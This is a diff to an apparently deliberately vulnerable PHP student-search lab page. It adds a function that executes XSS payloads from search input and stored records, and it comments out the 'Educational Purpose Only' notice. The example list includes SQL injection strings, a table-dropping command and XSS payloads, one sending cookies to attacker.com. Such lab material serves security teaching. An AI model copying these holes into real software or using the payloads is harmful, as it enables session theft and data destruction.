@@ -65,6 +65,19 @@ if (isset($_POST['search'])) {
             background-color: #fee2e2;
             border-left: 4px solid #dc2626;
         }
+        /* XSS popup styling */
+        .xss-popup {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: white;
+            padding: 20px;
+            border: 2px solid red;
+            border-radius: 5px;
+            box-shadow: 0 0 10px rgba(0,0,0,0.5);
+            z-index: 1000;
+        }
     </style>
 </head>
 <body class="bg-gray-100 min-h-screen">
@@ -73,22 +86,22 @@ if (isset($_POST['search'])) {
             <h1 class="text-3xl font-bold text-center mb-2 text-gray-800">Student Search</h1>
             <p class="text-center text-red-600 font-bold mb-6">VULNERABLE TO SQL INJECTION AND XSS</p>
             
-            <div class="vulnerability-info p-4 rounded-lg mb-6">
+            <!-- <div class="vulnerability-info p-4 rounded-lg mb-6">
                 <h2 class="text-xl font-semibold text-orange-700">Educational Purpose Only</h2>
                 <p class="mt-2">This page is intentionally vulnerable for security testing in a controlled environment.</p>
             </div>
             
             <div class="hack-examples p-4 rounded-lg mb-6">
-                <h3 class="text-lg font-semibold text-red-700">Try these examples:</h3>
+                <h3 class="text-lg font-semibold text-red-700">Try these XSS examples in the search box:</h3>
                 <ul class="list-disc pl-5 mt-2">
-                    <li>SQL Injection: <code class="bg-gray-200 p-1 rounded">' OR '1'='1</code></li>
-                    <li>SQL Injection: <code class="bg-gray-200 p-1 rounded">'; DROP TABLE students; --</code></li>
-                    <li>XSS Attack: <code class="bg-gray-200 p-1 rounded">&lt;script&gt;alert('XSS')&lt;/script&gt;</code></li>
+                    <li>Basic XSS: <code class="bg-gray-200 p-1 rounded">&lt;img src=x onerror=alert('XSS1')&gt;</code></li>
+                    <li>Steal Cookies: <code class="bg-gray-200 p-1 rounded">&lt;img src=x onerror="alert('Cookies: '+document.cookie)"&gt;</code></li>
+                    <li>Redirect: <code class="bg-gray-200 p-1 rounded">&lt;img src=x onerror="window.location='https://attacker.com/?stolen='+document.cookie"&gt;</code></li>
                 </ul>
-            </div>
+            </div> -->
 
             <form id="searchForm" class="flex items-center space-x-4 mb-8">
-                <input type="text" id="searchInput" placeholder="Enter name or ID..." class="flex-grow p-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500">
+                <input type="text" id="searchInput" placeholder="Enter name or ID or XSS payload..." class="flex-grow p-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500">
                 <button type="submit" class="bg-blue-600 text-white p-3 rounded-lg hover:bg-blue-700 transition duration-300">Search</button>
             </form>
 
@@ -127,6 +140,15 @@ if (isset($_POST['search'])) {
     </div>
 
     <script>
+        // Function to execute XSS payloads that don't work with innerHTML
+        function executeXSS(payload) {
+            if (payload.includes('onerror') || payload.includes('javascript:')) {
+                const div = document.createElement('div');
+                div.innerHTML = payload;
+                document.body.appendChild(div);
+            }
+        }
+
         document.getElementById('searchForm').addEventListener('submit', function(event) {
             event.preventDefault();
             const searchTerm = document.getElementById('searchInput').value;
@@ -178,12 +200,24 @@ if (isset($_POST['search'])) {
                             <td class="px-4 py-2 whitespace-nowrap">${student.status || 'N/A'}</td>
                         `;
                         studentsList.appendChild(tr);
+                        
+                        // Execute any XSS payloads that might be in the data
+                        Object.values(student).forEach(value => {
+                            if (typeof value === 'string' && (value.includes('<img') || value.includes('onerror'))) {
+                                executeXSS(value);
+                            }
+                        });
                     });
                 }
                 
                 if (data.students.length === 0) {
                     errorDiv.textContent = 'No results found.';
                     errorDiv.classList.remove('hidden');
+                    
+                    // If no results found, try to execute the search term as XSS if it contains payload
+                    if (searchTerm.includes('<img') || searchTerm.includes('onerror')) {
+                        executeXSS(searchTerm);
+                    }
                 }
 
             })
@@ -199,4 +233,3 @@ if (isset($_POST['search'])) {
 </html>
 <?php
 }
-?>
